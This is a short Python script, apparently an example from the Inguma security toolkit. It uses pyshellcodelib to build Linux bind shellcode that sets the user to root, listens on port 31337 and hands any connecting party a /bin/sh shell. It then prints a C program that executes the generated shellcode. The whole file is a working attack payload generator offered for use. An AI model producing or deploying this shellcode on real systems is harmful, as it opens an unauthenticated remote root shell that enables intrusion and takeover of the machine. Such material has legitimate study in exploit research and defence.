#!/usr/bin/python

"""
Classical bind shellcode with Pyshellcodelib from Inguma

Joxean Koret
"""

import sys
import socket

from pyshellcodelib import PyEgg

egg = PyEgg("linux")
gen = egg.generator

# Change to user root
egg.setuid(0)
egg.setgid(0)

# Listen in all available addresses at port 31337
egg.socket(socket.AF_INET, socket.SOCK_STREAM)
egg.bind(31337)
egg.listen()

# Got a connection, duplicate fd descriptors
egg.accept()
egg.dup2(2)
egg.dup2(1)
egg.dup2(0)

# Uncomment to append 101 characters (NOPS)
#egg.appendNops(101)

# Run /bin/sh
egg.execSh()

# Exit cleanly
egg.exit(0)

sc = egg.getShellcode()

print "#include <stdio.h>"
print
print 'char *sc="%s";' % sc
print
print "int main(void) {"
print "\t((void(*)())sc)();"
print "}"
print
